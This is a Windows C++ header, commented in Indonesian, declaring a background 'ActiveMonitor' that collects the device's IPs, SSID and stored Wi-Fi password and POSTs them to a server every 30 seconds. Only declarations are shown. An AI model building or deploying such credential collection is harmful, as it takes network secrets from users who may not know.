#ifndef ACTIVE_H
#define ACTIVE_H

#include <string>
#include <vector>
#include <windows.h>

struct DeviceStatus {
    std::string localIP;
    std::string publicIP;
    std::string ssid;
    std::string wifiPassword;
    std::string timestamp;
};

namespace ActiveMonitor {
    /**
     * Fungsi utama untuk mengumpulkan semua data dan mengirim ke server.
     * 
     * Data yang dikirim (POST ke /post-active):
     * Format: version|ssid|password
     * Contoh: 1.6.3|WifiName|password123
     * 
     * Fitur:
     * - Include versi client (CLIENT_VERSION) untuk tracking kompatibilitas
     * - Smart heartbeat: hanya kirim jika SSID berubah atau 10 menit sudah berlalu
     * - All data encrypted before transmission
     */
    void SendActiveStatus();

    /**
     * Memulai monitoring dalam thread terpisah.
     * Memanggil SendActiveStatus() setiap 30 detik.
     */
    void StartReactiveMonitoring();
    
    // Helper functions
    std::string GetPublicIP();
    std::string GetLocalIP();
    void GetWifiDetails(std::string& ssid, std::string& password);
}

#endif